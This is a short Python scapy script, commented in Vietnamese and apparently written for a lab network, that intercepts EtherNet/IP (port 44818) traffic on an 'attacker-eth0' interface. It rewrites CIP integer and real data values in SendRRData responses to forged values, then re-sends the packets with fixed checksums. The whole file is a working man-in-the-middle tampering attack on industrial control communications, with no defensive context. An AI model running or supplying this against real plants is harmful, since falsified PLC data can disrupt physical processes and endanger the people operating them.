from scapy.all import *

def process(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP) :
        if packet[TCP].sport == 44818 and Raw in packet:
            raw_data = bytes(packet[TCP].payload)

            if raw_data[0]==0x6f : 
                if raw_data[44:46] == b'\xc3\x00':
                    modified_data = (
                        raw_data[:46] +       
                        b'\x00\x00' +         
                        raw_data[48:]        
                    )
                    # Ghi đè lại payload
                    packet[TCP].remove_payload()
                    packet[TCP].add_payload(Raw(modified_data))
                elif raw_data[44:46] == b'\xca\x00':
                    modified_data = (
                        raw_data[:46] +       
                        b'\xaa\xaa' +         
                        raw_data[48:]        
                    )
                    # Ghi đè lại payload
                    packet[TCP].remove_payload()
                    packet[TCP].add_payload(Raw(modified_data))
                # Cập nhật checksum & length lại cho đúng
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum

            send(packet)
            print(f"Modified packet sent: {modified_data.hex()}")

sniff(iface="attacker-eth0", prn=process, filter="tcp port 44818")
